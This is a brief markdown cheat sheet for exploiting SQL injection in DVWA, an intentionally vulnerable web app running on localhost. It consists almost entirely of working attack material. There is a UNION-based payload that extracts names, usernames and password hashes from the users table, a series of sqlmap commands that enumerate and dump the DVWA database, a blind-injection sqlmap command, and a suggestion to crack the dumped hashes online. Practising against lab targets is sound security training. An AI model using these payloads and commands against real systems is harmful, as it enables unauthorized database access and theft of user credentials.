SQL
===

### SQL Injection

```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

Paste a hash in your web browser, trying to decrypt it.

### sqlmap

[sqlmap](http://sqlmap.org/) is an open source penetration testing tool that
automates the process of detecting and exploiting SQL injection flaws and
taking over of database servers.

#### Show Databases

```
./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" --dbs
```

#### Show Tables

```
./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa --tables
```

#### Show Columns

```
./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa -T users --columns
```

#### Dump Data

```
./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>" -D dvwa -T users --dump
```

### Blind SQL Injection

```
./sqlmap/sqlmap.py -u "http://localhost:8090/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="security=low; PHPSESSID=<YOUR PHPSESSID>"
```
